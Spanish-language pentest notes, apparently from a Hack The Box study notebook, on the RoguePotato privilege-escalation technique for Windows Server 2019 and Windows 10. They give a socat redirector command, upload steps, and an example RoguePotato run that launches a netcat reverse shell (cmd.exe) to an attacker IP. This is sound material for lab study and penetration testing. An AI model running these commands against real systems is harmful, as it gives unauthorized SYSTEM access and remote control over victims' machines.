
## DESCRIPTION

Igual que el Juicy potato pero para Windows Server 2019 o Windows 10

¿Que necesitamos?

![[Pasted image 20230221115231.png]]
Versiones afectadas: Server 2019 y 2010

#### Mas información
* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
* https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html

## EXPLOITATION

1. Necesitas ponerte a la escucha en la KALI:
```
socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
```

2. Subir a la máquina victima el ejecutable: https://github.com/antonioCoco/RoguePotato/releases/tag/1.0 --> [[TRANSFERRING FILES]]

3. Ejecutar en la máquina victima el comando

```
.\RoguePotato.exe -r <<YOUR_LISTENING_IP>> -e "<<command>>" -l 9999

#Ejemplo con nc (tambien subido)
c:\programdata\rg.exe -r 10.10.14.20 -e "c:\programdata\nc.exe 10.10.14.20 443 -e cmd.exe" -l 9999
```

![[Pasted image 20230228194904.png]]

**!!NOTA IMPORTANTE!!** 
	Si necesitamos cambiar el CSLID a un Windows Server 2019 le sirven los del Windows 10 Pro --> https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/

**!!NOTA IMPORTANTE!!** 
	Si da errores y podems subir una herramienta podemos probar PRINTSPOOFER -> https://github.com/itm4n/PrintSpoofer
	![[Pasted image 20230320191143.png]]
#### mejor probar si da problemas godpotatoe [[GOD POTATOE]]

## MACHINES

* Hack The Box: Remote, Worker

